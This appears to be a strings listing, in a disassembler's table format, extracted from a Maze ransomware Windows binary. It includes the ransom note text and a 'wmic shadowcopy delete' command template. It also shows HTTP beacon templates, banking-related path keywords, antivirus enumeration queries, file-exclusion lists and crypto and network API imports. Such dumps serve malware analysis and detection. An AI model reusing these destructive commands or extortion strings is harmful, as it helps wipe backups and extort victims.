[Strings]
nth  paddr      vaddr      len size section type    string
5840 0x0005f17e 0x0043737e 12  13   .text   ascii   kernel32.dll
5841 0x0005f1f0 0x004373f0 4   5    .text   ascii   h#tC
5842 0x0005f225 0x00437425 4   5    .text   ascii   hgtC
5843 0x0005f242 0x00437442 4   5    .text   ascii   hctC
5844 0x0005f51f 0x0043771f 4   6    .text   utf8    ̋T$\f blocks=Combining Diacritical Marks,Basic Latin
5845 0x0005f53c 0x0043773c 4   5    .text   ascii   L$\fW
5846 0x0005f56f 0x0043776f 5   7    .text   utf8    t\f+ш\a blocks=Basic Latin,Cyrillic
5847 0x0005f5a6 0x004377a6 7   9    .text   utf8    D$\b_ËD$ blocks=Basic Latin,Latin-1 Supplement
5848 0x0005f67a 0x0043787a 4   5    .text   ascii   oF f
5849 0x0005f6d6 0x004378d6 4   5    .text   ascii   oF f
5850 0x0005f72e 0x0043792e 4   5    .text   ascii   oF f
5851 0x0005f8f9 0x00437af9 6   8    .text   utf8    D$\f^_Ð blocks=Basic Latin,Latin-1 Supplement
5852 0x0005f905 0x00437b05 6   8    .text   utf8    D$\f^_Ð blocks=Basic Latin,Latin-1 Supplement
5853 0x0005f917 0x00437b17 7   9    .text   utf8    D$\f^_ÍI blocks=Basic Latin,Latin-1 Supplement
5854 0x0005f931 0x00437b31 6   8    .text   utf8    D$\f^_Ð blocks=Basic Latin,Latin-1 Supplement
5855 0x0005fa95 0x00437c95 6   8    .text   utf8    D$\f^_Ð blocks=Basic Latin,Latin-1 Supplement
5856 0x0005faa3 0x00437ca3 7   9    .text   utf8    D$\f^_ÍI blocks=Basic Latin,Latin-1 Supplement
5857 0x0005fab9 0x00437cb9 6   8    .text   utf8    D$\f^_Ð blocks=Basic Latin,Latin-1 Supplement
5858 0x0005fad3 0x00437cd3 6   8    .text   utf8    D$\f^_Í blocks=Basic Latin,Latin-1 Supplement
5859 0x0005fb0b 0x00437d0b 4   5    .text   ascii   oV f
5860 0x0005fb10 0x00437d10 4   5    .text   ascii   o^0f
5861 0x0005fb28 0x00437d28 4   5    .text   ascii   of@f
5862 0x0005fb2d 0x00437d2d 4   5    .text   ascii   onPf
5863 0x0005fb32 0x00437d32 4   5    .text   ascii   ov`f
5864 0x0005fb37 0x00437d37 4   5    .text   ascii   o~pf
5865 0x0005fba4 0x00437da4 5   6    .text   ascii   \aFGIu
5866 0x0005fbb0 0x00437db0 4   6    .text   utf8    X^_Í blocks=Basic Latin,Latin-1 Supplement
5867 0x0005fbd7 0x00437dd7 4   5    .text   ascii   FGIu
5868 0x0005fbff 0x00437dff 4   6    .text   utf8    ̋L$\b blocks=Combining Diacritical Marks,Basic Latin
5869 0x0005fcbe 0x00437ebe 4   6    .text   utf8    u9#ځ blocks=Basic Latin,Arabic
5870 0x0005fd10 0x00437f10 4   5    .text   ascii   H^[_
5871 0x0005fd17 0x00437f17 5   7    .text   utf8    ^[_À9 blocks=Basic Latin,Latin-1 Supplement
5872 0x0005fe15 0x00438015 4   5    .text   ascii   ^[_3
5873 0x0005fe59 0x00438059 4   6    .text   utf8    ^[_Ë blocks=Basic Latin,Latin-1 Supplement
5874 0x0005ffe5 0x004381e5 4   5    .text   ascii   D$\b_
5875 0x0005fffb 0x004381fb 5   7    .text   utf8    D$\b_È blocks=Basic Latin,Latin-1 Supplement
5876 0x00060003 0x00438203 4   5    .text   ascii   D$\b_
5877 0x00060068 0x00438268 4   5    .text   ascii   \at0f
5878 0x00060159 0x00438359 4   5    .text   ascii   ineI
5879 0x00060160 0x00438360 5   6    .text   ascii   5ntel
5880 0x00060170 0x00438370 6   7    .text   ascii   5Genu\v
5881 0x000601a5 0x004383a5 4   5    .text   ascii   t#=`
5882 0x000601c1 0x004383c1 4   5    .text   ascii   t\a=p
5883 0x000601e4 0x004383e4 8   10   .text   utf8    \a|5j\a3ɍu blocks=Basic Latin,Latin Extended-B
5884 0x000602e8 0x004384e8 6   8    .text   utf8    3\nD$\bS
5885 0x0006031d 0x0043851d 4   6    .text   utf8    V\v؋\n blocks=Basic Latin,Arabic
5886 0x0006035c 0x0043855c 4   5    .text   ascii   ^_[3
5887 0x00060399 0x00438599 5   7    .text   utf8    ^_[ÍB blocks=Basic Latin,Latin-1 Supplement
5888 0x000603a0 0x004385a0 5   7    .text   utf8    ^_[ÍB blocks=Basic Latin,Latin-1 Supplement
5889 0x00060918 0x00439318 31  32   .rdata  ascii   83729304958372930dhejskrlt9483s
5890 0x00060938 0x00439338 4   5    .rdata  ascii   .php
5891 0x0006093d 0x0043933d 4   5    .rdata  ascii   .asp
5892 0x00060942 0x00439342 5   6    .rdata  ascii   .aspx
5893 0x00060948 0x00439348 4   5    .rdata  ascii   .cgi
5894 0x0006094d 0x0043934d 4   5    .rdata  ascii   .jsp
5895 0x00060952 0x00439352 5   6    .rdata  ascii   .jspx
5896 0x0006095c 0x0043935c 7   8    .rdata  ascii   .action
5897 0x00060964 0x00439364 5   6    .rdata  ascii   .html
5898 0x0006096a 0x0043936a 6   7    .rdata  ascii   .phtml
5899 0x00060971 0x00439371 6   7    .rdata  ascii   .shtml
5900 0x00060a20 0x00439420 4   5    .rdata  ascii   news
5901 0x00060a25 0x00439425 5   6    .rdata  ascii   login
5902 0x00060a2b 0x0043942b 8   9    .rdata  ascii   register
5903 0x00060a34 0x00439434 6   7    .rdata  ascii   logout
5904 0x00060a3b 0x0043943b 4   5    .rdata  ascii   edit
5905 0x00060a40 0x00439440 7   8    .rdata  ascii   content
5906 0x00060a48 0x00439448 7   8    .rdata  ascii   private
5907 0x00060a50 0x00439450 8   9    .rdata  ascii   messages
5908 0x00060a59 0x00439459 7   8    .rdata  ascii   account
5909 0x00060a61 0x00439461 4   5    .rdata  ascii   view
5910 0x00060a66 0x00439466 7   8    .rdata  ascii   webauth
5911 0x00060a6e 0x0043946e 9   10   .rdata  ascii   webaccess
5912 0x00060a78 0x00439478 7   8    .rdata  ascii   archive
5913 0x00060a80 0x00439480 5   6    .rdata  ascii   forum
5914 0x00060a86 0x00439486 4   5    .rdata  ascii   post
5915 0x00060a8b 0x0043948b 6   7    .rdata  ascii   signin
5916 0x00060a92 0x00439492 7   8    .rdata  ascii   signout
5917 0x00060a9a 0x0043949a 6   7    .rdata  ascii   update
5918 0x00060aa1 0x004394a1 7   8    .rdata  ascii   support
5919 0x00060aa9 0x004394a9 6   7    .rdata  ascii   ticket
5920 0x00060ab0 0x004394b0 4   5    .rdata  ascii   task
5921 0x00060ab5 0x004394b5 7   8    .rdata  ascii   tracker
5922 0x00060abd 0x004394bd 9   10   .rdata  ascii   analytics
5923 0x00060ac7 0x004394c7 5   6    .rdata  ascii   check
5924 0x00060acd 0x004394cd 8   9    .rdata  ascii   checkout
5925 0x00060ad6 0x004394d6 6   7    .rdata  ascii   payout
5926 0x00060add 0x004394dd 10  11   .rdata  ascii   withdrawal
5927 0x00060ae8 0x004394e8 4   5    .rdata  ascii   sepa
5928 0x00060aed 0x004394ed 6   7    .rdata  ascii   create
5929 0x00060af4 0x004394f4 8   9    .rdata  ascii   transfer
5930 0x00060afd 0x004394fd 4   5    .rdata  ascii   wire
5931 0x00060b02 0x00439502 11  12   .rdata  ascii   http://%s%s
5932 0x00060b16 0x00439516 8   18   .rdata  utf16le @\foo.db
5933 0x00060b28 0x00439528 9   10   .rdata  ascii   ntdll.dll
5934 0x00060b32 0x00439532 13  14   .rdata  ascii   NtQueryEaFile
5935 0x00060b40 0x00439540 46  94   .rdata  utf16le Microsoft Enhanced Cryptographic Provider v1.0
5936 0x00060b9e 0x0043959e 6   7    .rdata  ascii   LILITH
5937 0x00060ba5 0x004395a5 15  16   .rdata  ascii   %EMAIL_ADDRESS%
5938 0x00060bb5 0x004395b5 20  21   .rdata  ascii   %BASE64_PLACEHOLDER%
5939 0x00060bca 0x004395ca 11  12   .rdata  ascii   NtSetEaFile
5940 0x0006897d 0x0044137d 6   7    .rdata  ascii   D7q/;M
5941 0x000689b6 0x004413b6 5   7    .rdata  utf8    \aؾopE blocks=Basic Latin,Arabic
5942 0x000689cd 0x004413cd 4   5    .rdata  ascii   }\fUo
5943 0x00068a0b 0x0044140b 5   7    .rdata  utf8    w̡\f$u blocks=Basic Latin,Combining Diacritical Marks
5944 0x00068a12 0x00441412 4   5    .rdata  ascii   +Yo,
5945 0x00068a6b 0x0044146b 4   5    .rdata  ascii   \ng))
5946 0x00068a7a 0x0044147a 6   7    .rdata  ascii   &\8!\e.
5947 0x00068a85 0x00441485 4   6    .rdata  utf8    m,M߳ blocks=Basic Latin,NKo
5948 0x00068a94 0x00441494 4   5    .rdata  ascii   Ts\ne
5949 0x00068ae0 0x004414e0 4   5    .rdata  ascii   * qW
5950 0x00068afa 0x004414fa 5   6    .rdata  ascii   AQ\bl7
5951 0x00068b04 0x00441504 4   5    .rdata  ascii   LwH'
5952 0x00068b22 0x00441522 5   7    .rdata  utf8    cwOʜ[ blocks=Basic Latin,IPA Extensions
5953 0x00068b33 0x00441533 5   8    .rdata  utf8    ]t`/ blocks=Basic Latin,Private Use Area
5954 0x00068b6d 0x0044156d 5   7    .rdata  utf8    xqƜa& blocks=Basic Latin,Latin Extended-B
5955 0x00068bac 0x004415ac 4   5    .rdata  ascii   5\vq\e
5956 0x00068bd7 0x004415d7 4   5    .rdata  ascii   L*~e
5957 0x00068c20 0x00441620 29  30   .rdata  ascii   Wow64RevertWow64FsRedirection
5958 0x00068c3e 0x0044163e 8   18   .rdata  utf16le kernel32
5959 0x00068c52 0x00441652 30  31   .rdata  ascii   Wow64DisableWow64FsRedirection
5960 0x00068c7a 0x0044167a 14  30   .rdata  utf16le \wbem\wmic.exe
5961 0x00068c98 0x00441698 22  46   .rdata  utf16le "%s" shadowcopy delete
5962 0x00068cc6 0x004416c6 7   8    .rdata  ascii   realloc
5963 0x00068cce 0x004416ce 10  11   .rdata  ascii   msvcrt.dll
5964 0x00068cd9 0x004416d9 4   5    .rdata  ascii   free
5965 0x00068cde 0x004416de 6   7    .rdata  ascii   malloc
5966 0x00068d09 0x00441709 69  70   .rdata  ascii   ET /%s HTTP/1.1\r\nUser-Agent: %s\r\nHost: %s\r\nConnection: Keep-Alive\r\n\r\n
5967 0x00068d4f 0x0044174f 109 110  .rdata  ascii   POST /%s HTTP/1.1\r\nUser-Agent: %s\r\nHost: %s\r\nContent-Type: %s\r\nContent-Length: %d\r\nConnection: Keep-Alive\r\n\r\n
5968 0x00068dbd 0x004417bd 4   5    .rdata  ascii   \r\n\r\n
5969 0x00068dc2 0x004417c2 16  17   .rdata  ascii   Content-Length: 
5970 0x00068dd3 0x004417d3 72  73   .rdata  ascii   Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko
5971 0x00068e20 0x00441820 4   5    .rdata  ascii   POST
5972 0x00068e48 0x00441848 47  48   .rdata  ascii   Content-Type: application/x-www-form-urlencoded
5973 0x00068e98 0x00441898 33  34   .rdata  ascii   application/x-www-form-urlencoded
5974 0x00068ec2 0x004418c2 28  58   .rdata  utf16le A%windir%\system32\wbem\wmic
5975 0x00068efc 0x004418fc 37  76   .rdata  utf16le process call create "cmd /c start %s"
5976 0x00068f48 0x00441948 5   12   .rdata  utf16le runas
5977 0x00068f5c 0x0044195c 32  33   .rdata  ascii   37432154789765254678988765432123
5978 0x00068f7d 0x0044197d 8   9    .rdata  ascii   09873245
5979 0x000692f0 0x00441cf0 4   5    .rdata  ascii   none
5980 0x0006e4b6 0x00446eb6 9   20   .rdata  utf16le :\Windows
5981 0x0006e4ca 0x00446eca 14  30   .rdata  utf16le \Program Files
5982 0x0006e4e8 0x00446ee8 7   16   .rdata  utf16le \Games\
5983 0x0006e4f8 0x00446ef8 13  28   .rdata  utf16le \Tor Browser\
5984 0x0006e514 0x00446f14 13  28   .rdata  utf16le \ProgramData\
5985 0x0006e530 0x00446f30 16  34   .rdata  utf16le \cache2\entries\
5986 0x0006e552 0x00446f52 17  36   .rdata  utf16le \Low\Content.IE5\
5987 0x0006e576 0x00446f76 25  52   .rdata  utf16le \User Data\Default\Cache\
5988 0x0006e5aa 0x00446faa 10  22   .rdata  utf16le \All Users
5989 0x0006e5c0 0x00446fc0 62  126  .rdata  utf16le qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890
5990 0x0006e63e 0x0044703e 5   12   .rdata  utf16le %s.%s
5991 0x0006e66a 0x0044706a 37  76   .rdata  utf16le B1234567890qwertyuiopasdfghjklzxcvbnm
5992 0x0006e6b6 0x004470b6 4   10   .rdata  utf16le .dat
5993 0x0006e6c0 0x004470c0 9   20   .rdata  utf16le Global\%s
5994 0x0006e6d4 0x004470d4 18  38   .rdata  utf16le DECRYPT-FILES.html
5995 0x0006e6fa 0x004470fa 11  24   .rdata  utf16le autorun.inf
5996 0x0006e712 0x00447112 8   18   .rdata  utf16le boot.ini
5997 0x0006e724 0x00447124 11  24   .rdata  utf16le desktop.ini
5998 0x0006e73c 0x0044713c 10  22   .rdata  utf16le ntuser.dat
5999 0x0006e752 0x00447152 12  26   .rdata  utf16le iconcache.db
6000 0x0006e76c 0x0044716c 12  26   .rdata  utf16le bootsect.bak
6001 0x0006e786 0x00447186 14  30   .rdata  utf16le ntuser.dat.log
6002 0x0006e7a4 0x004471a4 9   20   .rdata  utf16le thumbs.db
6003 0x0006e7b8 0x004471b8 12  26   .rdata  utf16le Bootfont.bin
6004 0x0006e7d2 0x004471d2 5   12   .rdata  utf16le %s\%s
6005 0x0006e7de 0x004471de 9   20   .rdata  utf16le overflow|
6006 0x0006e832 0x00447232 21  44   .rdata  utf16le Broot\SecurityCenter2
6007 0x0006e85e 0x0044725e 30  62   .rdata  utf16le Select * From AntiVirusProduct
6008 0x0006e89c 0x0044729c 11  24   .rdata  utf16le displayName
6009 0x0006e8b4 0x004472b4 5   12   .rdata  utf16le none|
6010 0x0006e8c8 0x004472c8 8   18   .rdata  utf16le verflow|
6011 0x0006e8da 0x004472da 12  26   .rdata  utf16le %c_%c_%d/%d|
6012 0x0006e8f4 0x004472f4 4   10   .rdata  utf16le %x%x
6013 0x0006e91a 0x0044731a 5   12   .rdata  utf16le B"%s"
6014 0x0006e926 0x00447326 10  22   .rdata  utf16le 1234567890
6015 0x0006e95e 0x0044735e 61  124  .rdata  utf16le Bqwertyuiopasdfghjklzxcvbnm1234567890                        
6016 0x0006ea22 0x00447422 4   10   .rdata  utf16le CWQL
6017 0x0006ea64 0x00447464 32  33   .rdata  ascii   expand 32-byte kexpand 16-byte k
6018 0x0006ea9a 0x0044749a 16  34   .rdata  utf16le CMaze Ransomware
6019 0x0006eabc 0x004474bc 413 828  .rdata  utf16le %s\n\nDear %s, your files have been encrypted by RSA-2048 and ChaCha algorithms\nThe only way to restore them is to buy decryptor\n\nThese algorithms are one of the strongest\nYou can read about them at wikipedia\n\nIf you understand importance of situation you can restore all files by following instructions in DECRYPT-FILES.html file\n\nYou can decrypt 1 file for free as a proof of work\nWe know that this computer is a 
6020 0x0006edf8 0x004477f8 17  36   .rdata  utf16le standalone server
6021 0x0006ee1c 0x0044781c 27  56   .rdata  utf16le server in corporate network
6022 0x0006ee54 0x00447854 32  66   .rdata  utf16le workstation in corporate network
6023 0x0006ee96 0x00447896 13  28   .rdata  utf16le home computer
6024 0x0006eeb2 0x004478b2 25  52   .rdata  utf16le primary domain controller
6025 0x0006eee6 0x004478e6 13  28   .rdata  utf16le backup server
6026 0x0006ef02 0x00447902 21  44   .rdata  utf16le very valuable for you
6027 0x0006ef2e 0x0044792e 54  110  .rdata  utf16le \nSo we will give you appropriate price for recovering\n
6028 0x0006ef9c 0x0044799c 14  30   .rdata  utf16le \123456789.bmp
6029 0x0006efba 0x004479ba 56  114  .rdata  utf16le You need to buy decryptor in order to restore the files.
6030 0x0006f02c 0x00447a2c 81  164  .rdata  utf16le %s! Alert! %s! Alert! Dear %s Your files have been encrypted by %s! Attention! %s
6031 0x0006f101 0x00447b01 4   5    .rdata  ascii   K.$t
6032 0x0006f4f2 0x00447ef2 11  12   .rdata  ascii   CloseWindow
6033 0x0006f500 0x00447f00 16  17   .rdata  ascii   AdjustWindowRect
6034 0x0006f514 0x00447f14 13  14   .rdata  ascii   DestroyWindow
6035 0x0006f524 0x00447f24 9   10   .rdata  ascii   wsprintfW
6036 0x0006f530 0x00447f30 11  12   .rdata  ascii   MessageBoxW
6037 0x0006f53e 0x00447f3e 14  15   .rdata  ascii   DeferWindowPos
6038 0x0006f550 0x00447f50 16  17   .rdata  ascii   EnumChildWindows
6039 0x0006f564 0x00447f64 13  14   .rdata  ascii   AnimateWindow
6040 0x0006f574 0x00447f74 19  20   .rdata  ascii   GetForegroundWindow
6041 0x0006f58a 0x00447f8a 15  16   .rdata  ascii   PostQuitMessage
6042 0x0006f59c 0x00447f9c 25  26   .rdata  ascii   ShutdownBlockReasonCreate
6043 0x0006f5b8 0x00447fb8 14  15   .rdata  ascii   DefWindowProcA
6044 0x0006f5ca 0x00447fca 26  27   .rdata  ascii   ShutdownBlockReasonDestroy
6045 0x0006f5e8 0x00447fe8 16  17   .rdata  ascii   RegisterClassExW
6046 0x0006f5fc 0x00447ffc 15  16   .rdata  ascii   CreateWindowExW
6047 0x0006f60e 0x0044800e 11  12   .rdata  ascii   GetMessageA
6048 0x0006f61c 0x0044801c 16  17   .rdata  ascii   TranslateMessage
6049 0x0006f630 0x00448030 16  17   .rdata  ascii   DispatchMessageA
6050 0x0006f644 0x00448044 9   10   .rdata  ascii   ReleaseDC
6051 0x0006f64e 0x0044804e 10  11   .rdata  ascii   USER32.dll
6052 0x0006f65c 0x0044805c 13  14   .rdata  ascii   SelectPalette
6053 0x0006f66c 0x0044806c 17  18   .rdata  ascii   SetPaletteEntries
6054 0x0006f680 0x00448080 13  14   .rdata  ascii   GetDeviceCaps
6055 0x0006f690 0x00448090 8   9    .rdata  ascii   SetPixel
6056 0x0006f69c 0x0044809c 12  13   .rdata  ascii   DeleteObject
6057 0x0006f6aa 0x004480aa 9   10   .rdata  ascii   GDI32.dll
6058 0x0006f6b6 0x004480b6 13  14   .rdata  ascii   GetVersionExA
6059 0x0006f6c6 0x004480c6 11  12   .rdata  ascii   MoveFileExA
6060 0x0006f6d4 0x004480d4 20  21   .rdata  ascii   GetWindowsDirectoryA
6061 0x0006f6ec 0x004480ec 11  12   .rdata  ascii   CreateFileA
6062 0x0006f6fa 0x004480fa 11  12   .rdata  ascii   GetFileSize
6063 0x0006f708 0x00448108 10  11   .rdata  ascii   LocalAlloc
6064 0x0006f716 0x00448116 8   9    .rdata  ascii   ReadFile
6065 0x0006f722 0x00448122 11  12   .rdata  ascii   CloseHandle
6066 0x0006f730 0x00448130 9   10   .rdata  ascii   WriteFile
6067 0x0006f73c 0x0044813c 15  16   .rdata  ascii   DeviceIoControl
6068 0x0006f74e 0x0044814e 10  11   .rdata  ascii   OpenMutexW
6069 0x0006f75c 0x0044815c 12  13   .rdata  ascii   CreateMutexW
6070 0x0006f76c 0x0044816c 8   9    .rdata  ascii   lstrlenA
6071 0x0006f778 0x00448178 18  19   .rdata  ascii   OutputDebugStringW
6072 0x0006f78e 0x0044818e 16  17   .rdata  ascii   GetModuleHandleA
6073 0x0006f7a2 0x004481a2 12  13   .rdata  ascii   LoadLibraryA
6074 0x0006f7b2 0x004481b2 8   9    .rdata  ascii   lstrcpyA
6075 0x0006f7be 0x004481be 8   9    .rdata  ascii   lstrcatA
6076 0x0006f7ca 0x004481ca 14  15   .rdata  ascii   GetProcAddress
6077 0x0006f7dc 0x004481dc 12  13   .rdata  ascii   GetTickCount
6078 0x0006f7ec 0x004481ec 19  20   .rdata  ascii   WaitForSingleObject
6079 0x0006f802 0x00448202 11  12   .rdata  ascii   TlsSetValue
6080 0x0006f810 0x00448210 11  12   .rdata  ascii   CreateFileW
6081 0x0006f81e 0x0044821e 9   10   .rdata  ascii   HeapAlloc
6082 0x0006f82a 0x0044822a 12  13   .rdata  ascii   VirtualAlloc
6083 0x0006f83a 0x0044823a 11  12   .rdata  ascii   VirtualFree
6084 0x0006f848 0x00448248 11  12   .rdata  ascii   TlsGetValue
6085 0x0006f856 0x00448256 10  11   .rdata  ascii   ExitThread
6086 0x0006f864 0x00448264 8   9    .rdata  ascii   lstrcatW
6087 0x0006f870 0x00448270 11  12   .rdata  ascii   ExitProcess
6088 0x0006f87e 0x0044827e 12  13   .rdata  ascii   GetLastError
6089 0x0006f88e 0x0044828e 24  25   .rdata  ascii   CreateToolhelp32Snapshot
6090 0x0006f8aa 0x004482aa 15  16   .rdata  ascii   Process32FirstW
6091 0x0006f8bc 0x004482bc 14  15   .rdata  ascii   Process32NextW
6092 0x0006f8ce 0x004482ce 16  17   .rdata  ascii   GetModuleHandleW
6093 0x0006f8e2 0x004482e2 19  20   .rdata  ascii   GetSystemDirectoryW
6094 0x0006f8f8 0x004482f8 14  15   .rdata  ascii   CreateProcessW
6095 0x0006f90a 0x0044830a 17  18   .rdata  ascii   GetShortPathNameW
6096 0x0006f91e 0x0044831e 25  26   .rdata  ascii   ExpandEnvironmentStringsW
6097 0x0006f93a 0x0044833a 5   6    .rdata  ascii   Sleep
6098 0x0006f942 0x00448342 19  20   .rdata  ascii   GetCurrentProcessId
6099 0x0006f958 0x00448358 12  13   .rdata  ascii   VirtualQuery
6100 0x0006f968 0x00448368 14  15   .rdata  ascii   VirtualProtect
6101 0x0006f97a 0x0044837a 12  13   .rdata  ascii   IsBadReadPtr
6102 0x0006f98a 0x0044838a 11  12   .rdata  ascii   FreeLibrary
6103 0x0006f998 0x00448398 8   9    .rdata  ascii   lstrcmpA
6104 0x0006f9a4 0x004483a4 15  16   .rdata  ascii   UnmapViewOfFile
6105 0x0006f9b6 0x004483b6 9   10   .rdata  ascii   lstrcmpiW
6106 0x0006f9c2 0x004483c2 8   9    .rdata  ascii   lstrlenW
6107 0x0006f9ce 0x004483ce 8   9    .rdata  ascii   lstrcpyW
6108 0x0006f9da 0x004483da 11  12   .rdata  ascii   MoveFileExW
6109 0x0006f9e8 0x004483e8 14  15   .rdata  ascii   FindFirstFileW
6110 0x0006f9fa 0x004483fa 8   9    .rdata  ascii   lstrcmpW
6111 0x0006fa06 0x00448406 13  14   .rdata  ascii   FindNextFileW
6112 0x0006fa16 0x00448416 9   10   .rdata  ascii   FindClose
6113 0x0006fa22 0x00448422 12  13   .rdata  ascii   CreateThread
6114 0x0006fa32 0x00448432 22  23   .rdata  ascii   WaitForMultipleObjects
6115 0x0006fa4c 0x0044844c 13  14   .rdata  ascii   GetDriveTypeW
6116 0x0006fa5c 0x0044845c 14  15   .rdata  ascii   GetTickCount64
6117 0x0006fa6e 0x0044846e 23  24   .rdata  ascii   SetThreadExecutionState
6118 0x0006fa88 0x00448488 13  14   .rdata  ascii   GetFileSizeEx
6119 0x0006fa98 0x00448498 16  17   .rdata  ascii   SetFilePointerEx
6120 0x0006faac 0x004484ac 18  19   .rdata  ascii   CreateFileMappingW
6121 0x0006fac2 0x004484c2 13  14   .rdata  ascii   MapViewOfFile
6122 0x0006fad2 0x004484d2 17  18   .rdata  ascii   GetCurrentProcess
6123 0x0006fae6 0x004484e6 9   10   .rdata  ascii   LocalFree
6124 0x0006faf2 0x004484f2 24  25   .rdata  ascii   GetUserDefaultUILanguage
6125 0x0006fb0e 0x0044850e 25  26   .rdata  ascii   InitializeCriticalSection
6126 0x0006fb2a 0x0044852a 21  22   .rdata  ascii   DeleteCriticalSection
6127 0x0006fb42 0x00448542 12  13   .rdata  ascii   SetLastError
6128 0x0006fb52 0x00448552 20  21   .rdata  ascii   EnterCriticalSection
6129 0x0006fb6a 0x0044856a 20  21   .rdata  ascii   LeaveCriticalSection
6130 0x0006fb82 0x00448582 15  16   .rdata  ascii   TerminateThread
6131 0x0006fb94 0x00448594 11  12   .rdata  ascii   GlobalAlloc
6132 0x0006fba2 0x004485a2 10  11   .rdata  ascii   GlobalFree
6133 0x0006fbb0 0x004485b0 4   5    .rdata  ascii   Beep
6134 0x0006fbb6 0x004485b6 12  13   .rdata  ascii   KERNEL32.dll
6135 0x0006fbc6 0x004485c6 28  29   .rdata  ascii   InitializeSecurityDescriptor
6136 0x0006fbe6 0x004485e6 24  25   .rdata  ascii   LsaCreateTrustedDomainEx
6137 0x0006fc02 0x00448602 14  15   .rdata  ascii   EqualDomainSid
6138 0x0006fc14 0x00448614 17  18   .rdata  ascii   EncryptionDisable
6139 0x0006fc28 0x00448628 13  14   .rdata  ascii   LsaFreeMemory
6140 0x0006fc38 0x00448638 21  22   .rdata  ascii   AreAllAccessesGranted
6141 0x0006fc50 0x00448650 19  20   .rdata  ascii   LsaAddAccountRights
6142 0x0006fc66 0x00448666 8   9    .rdata  ascii   LsaClose
6143 0x0006fc72 0x00448672 14  15   .rdata  ascii   CryptGenRandom
6144 0x0006fc84 0x00448684 25  26   .rdata  ascii   LsaQueryTrustedDomainInfo
6145 0x0006fca0 0x004486a0 20  21   .rdata  ascii   CryptAcquireContextW
6146 0x0006fcb8 0x004486b8 11  12   .rdata  ascii   CryptGenKey
6147 0x0006fcc6 0x004486c6 14  15   .rdata  ascii   CryptExportKey
6148 0x0006fcd8 0x004486d8 15  16   .rdata  ascii   CryptDestroyKey
6149 0x0006fcea 0x004486ea 19  20   .rdata  ascii   CryptReleaseContext
6150 0x0006fd00 0x00448700 17  18   .rdata  ascii   LookupAccountSidW
6151 0x0006fd14 0x00448714 23  24   .rdata  ascii   GetSidSubAuthorityCount
6152 0x0006fd2e 0x0044872e 18  19   .rdata  ascii   GetSidSubAuthority
6153 0x0006fd44 0x00448744 14  15   .rdata  ascii   CryptImportKey
6154 0x0006fd56 0x00448756 12  13   .rdata  ascii   CryptEncrypt
6155 0x0006fd66 0x00448766 12  13   .rdata  ascii   CryptDecrypt
6156 0x0006fd74 0x00448774 12  13   .rdata  ascii   ADVAPI32.dll
6157 0x0006fd84 0x00448784 16  17   .rdata  ascii   SHGetFolderPathW
6158 0x0006fd98 0x00448798 15  16   .rdata  ascii   ShellExecuteExW
6159 0x0006fda8 0x004487a8 11  12   .rdata  ascii   SHELL32.dll
6160 0x0006fdb6 0x004487b6 19  20   .rdata  ascii   LsaConnectUntrusted
6161 0x0006fdca 0x004487ca 11  12   .rdata  ascii   Secur32.dll
6162 0x0006fdd8 0x004487d8 33  34   .rdata  ascii   DsRoleGetPrimaryDomainInformation
6163 0x0006fdfc 0x004487fc 16  17   .rdata  ascii   DsRoleFreeMemory
6164 0x0006fe0e 0x0044880e 12  13   .rdata  ascii   NETAPI32.dll
6165 0x0006fe1e 0x0044881e 9   10   .rdata  ascii   StrToIntA
6166 0x0006fe2a 0x0044882a 7   8    .rdata  ascii   StrStrW
6167 0x0006fe32 0x00448832 11  12   .rdata  ascii   SHLWAPI.dll
6168 0x0006fe40 0x00448840 13  14   .rdata  ascii   WNetOpenEnumW
6169 0x0006fe50 0x00448850 17  18   .rdata  ascii   WNetEnumResourceW
6170 0x0006fe64 0x00448864 19  20   .rdata  ascii   WNetAddConnection2W
6171 0x0006fe7a 0x0044887a 13  14   .rdata  ascii   WNetCloseEnum
6172 0x0006fe88 0x00448888 7   8    .rdata  ascii   MPR.dll
6173 0x0006fe92 0x00448892 9   10   .rdata  ascii   inet_pton
6174 0x0006fe9c 0x0044889c 10  11   .rdata  ascii   WS2_32.dll
6175 0x0006feaa 0x004488aa 13  14   .rdata  ascii   InternetOpenA
6176 0x0006feba 0x004488ba 17  18   .rdata  ascii   InternetCrackUrlA
6177 0x0006fece 0x004488ce 16  17   .rdata  ascii   InternetConnectA
6178 0x0006fee2 0x004488e2 16  17   .rdata  ascii   HttpOpenRequestA
6179 0x0006fef6 0x004488f6 16  17   .rdata  ascii   HttpSendRequestA
